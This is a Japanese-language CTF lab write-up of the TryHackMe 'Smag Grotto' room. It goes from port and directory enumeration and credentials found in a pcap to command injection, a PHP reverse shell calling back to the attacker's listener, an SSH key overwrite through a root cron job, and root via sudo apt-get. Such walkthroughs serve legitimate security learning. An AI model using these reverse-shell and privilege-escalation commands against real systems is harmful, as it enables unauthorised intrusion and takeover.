# Smag Grotto CTF

https://tryhackme.com/room/smaggrotto

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.112.168
root@ip-10-10-144-220:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-13 05:08 GMT
Nmap scan report for 10.10.112.168
Host is up (0.00017s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:2E:60:D7:7D:0B (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 2.42 seconds
root@ip-10-10-144-220:~# sudo nmap -sV -p22,80 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-13 05:08 GMT
Nmap scan report for 10.10.112.168
Host is up (0.00092s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
MAC Address: 02:2E:60:D7:7D:0B (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.17 seconds
```

### gobuster

```shell
root@ip-10-10-144-220:~# gobuster dir -x=txt,php -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.112.168
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/mail                 (Status: 301) [Size: 313] [--> http://10.10.112.168/mail/]
/index.php            (Status: 200) [Size: 402]
/server-status        (Status: 403) [Size: 278]
Progress: 654825 / 654828 (100.00%)
===============================================================
Finished
===============================================================
```

### /mail

```text
The following emails are being displayed using our new and improved email2web software, allowing you to view your emails in a hassle free way!

Note: all attachments must be downloaded with wget.
```

添付されていた pcap をダウンロード

```shell
$ wget http://10.10.112.168/aW1wb3J0YW50/dHJhY2Uy.pcap
```

### pcap

```http
POST /login.php HTTP/1.1
Host: development.smag.thm
User-Agent: curl/7.47.0
Accept: */*
Content-Length: 39
Content-Type: application/x-www-form-urlencoded

username=helpdesk&password=cH4nG3M3_n0wHTTP/1.1 200 OK
Date: Wed, 03 Jun 2020 18:04:07 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```

development.smag.thm を hosts に追加してアクセスすると、リスト画面が表示されて、admin.php, login.php があることが分かる。

### admin.php

helpdesk / cH4nG3M3_n0w でログイン可能。コマンド入力画面が表示される。  
id 等を実行しても何も表示されないが、ping を打ったら反応があった。

```text
$ tshark -i tun0
Capturing on 'tun0'
    1 0.000000000  10.2.22.182 → 10.10.112.168 TCP 60 38798 → 80 [SYN] Seq=0 Win=32120 Len=0 MSS=1460 SACK_PERM TSval=2472752503 TSecr=0 WS=128
    2 0.270700554 10.10.112.168 → 10.2.22.182  TCP 60 80 → 38798 [SYN, ACK] Seq=0 Ack=1 Win=26847 Len=0 MSS=1288 SACK_PERM TSval=142903 TSecr=2472752503 WS=128
    3 0.270770549  10.2.22.182 → 10.10.112.168 TCP 52 38798 → 80 [ACK] Seq=1 Ack=1 Win=32128 Len=0 TSval=2472752774 TSecr=142903
```

リバースシェル

```shell
php -r '$sock=fsockopen("10.2.22.182",6666);exec("sh <&3 >&3 2>&3");'
```

```shell
$ nc -nlvp 6666
listening on [any] 6666 ...
connect to [10.2.22.182] from (UNKNOWN) [10.10.112.168] 50850
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

シェル取得成功。

安定化。

```shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@smag:/var/www/development.smag.thm$ export TERM=xterm
export TERM=xterm
```

```shell
www-data@smag:/var/www/development.smag.thm$ ls -al /home
ls -al /home
total 12
drwxr-xr-x  3 root root 4096 Jun  4  2020 .
drwxr-xr-x 22 root root 4096 Jun  4  2020 ..
drwxr-xr-x  4 jake jake 4096 Jun  5  2020 jake
www-data@smag:/var/www/development.smag.thm$ ls -al /home/jake
ls -al /home/jake
total 60
drwxr-xr-x 4 jake jake 4096 Jun  5  2020 .
drwxr-xr-x 3 root root 4096 Jun  4  2020 ..
-rw------- 1 jake jake  490 Jun  5  2020 .bash_history
-rw-r--r-- 1 jake jake  220 Jun  4  2020 .bash_logout
-rw-r--r-- 1 jake jake 3771 Jun  4  2020 .bashrc
drwx------ 2 jake jake 4096 Jun  4  2020 .cache
-rw------- 1 root root   28 Jun  5  2020 .lesshst
-rw-r--r-- 1 jake jake  655 Jun  4  2020 .profile
-rw-r--r-- 1 root root   75 Jun  4  2020 .selected_editor
drwx------ 2 jake jake 4096 Jun  4  2020 .ssh
-rw-r--r-- 1 jake jake    0 Jun  4  2020 .sudo_as_admin_successful
-rw------- 1 jake jake 9336 Jun  5  2020 .viminfo
-rw-r--r-- 1 root root  167 Jun  5  2020 .wget-hsts
-rw-rw---- 1 jake jake   33 Jun  4  2020 user.txt
```

jake に昇格する必要がある。

## 権限昇格１

sudo、SUID、SGID、jake オーナーファイルは特になし。

'jake' キーワードでファイル検索（抜粋）

```shell
www-data@smag:/var/www/development.smag.thm$ find / -type f -exec grep -i -I "jake" {} /dev/null \; 2>/dev/null
ke" {} /dev/null \; 2>/dev/null "ja

/etc/apache2/sites-available/development.smag.thm.conf: ServerAdmin jake@smag.thm

/etc/crontab:*  *    * * *   root       /bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys

/var/www/html/mail/index.php:                                   <a>From: jake@smag.thm</a>
/var/www/html/mail/index.php:                                   <a>To: jake@smag.thm</a>
/var/www/html/mail/index.php:                                   <a>From: jake@smag.com</a>
```

root が、/opt/.backups/jake_id_rsa.pub.backup を /home/jake/.ssh/authorized_keys にコピーしている。

```shell
ls -al /opt/.backups
total 12
drwxr-xr-x 2 root root 4096 Jun  4  2020 .
drwxr-xr-x 3 root root 4096 Jun  4  2020 ..
-rw-rw-rw- 1 root root  563 Jun  5  2020 jake_id_rsa.pub.backup
```

コピー元ファイルは上書き可能。

つまり、kali 側で新しい鍵ペアを生成し、生成した公開鍵でコピー元ファイルを上書きすれば、秘密鍵を使って jake として SSH 接続できることになる。

### 鍵生成

```shell
$ ssh-keygen -t rsa
```

### /opt/.backups/jake_id_rsa.pub.backup 上書き

```shell
# kali
$ nc -nlvp 6667 < ./id_rsa_jake.pub
listening on [any] 6667 ...
connect to [10.2.22.182] from (UNKNOWN) [10.10.112.168] 45320

# target
www-data@smag:/var/www/development.smag.thm$ nc 10.2.22.182 6667 > /opt/.backups/jake_id_rsa.pub.backup
```

### SSH 接続

```shell
$ ssh jake@10.10.112.168 -i ./id_rsa_jake
The authenticity of host '10.10.112.168 (10.10.112.168)' can't be established.
ED25519 key fingerprint is SHA256:N0hcdtAhlytMwu8PGLVD+c0ZKcV7TMNWnOr0wVw0Wp8.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.112.168' (ED25519) to the list of known hosts.
Enter passphrase for key './id_rsa_jake':
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Last login: Fri Jun  5 10:15:15 2020
jake@smag:~$
```

jake として SSH 接続成功。

```shell
jake@smag:~$ cat user.txt
iu.................................
```

ユーザーフラグゲット

## 権限昇格２

```shell
jake@smag:~$ sudo -l
Matching Defaults entries for jake on smag:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on smag:
    (ALL : ALL) NOPASSWD: /usr/bin/apt-get
```

apt-get に sudo が付いている。  
3 つ方法があるうち、2 つは機能しなかった。（インターネット接続が無いため）  
3 つめで成功。

```shell
jake@smag:~$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
```

root 昇格成功。

```shell
# ls -al /root
total 28
drwx------  3 root root 4096 Jun  4  2020 .
drwxr-xr-x 22 root root 4096 Jun  4  2020 ..
-rw-------  1 root root    0 Jun  4  2020 .bash_history
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwxr-xr-x  2 root root 4096 Jun  4  2020 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-rw----  1 root root   33 Jun  4  2020 root.txt
-rw-------  1 root root 1371 Jun  4  2020 .viminfo
# cat /root/root.txt
uJ............................
```

## 振り返り

- ここ数日で習った Wireshark と TShark の技が早速役に立ってうれしかった。
- SSH のトリックが即座に理解できたことに進歩を感じた。
- apt-get はオフラインでも使える方法があることを覚えておく。
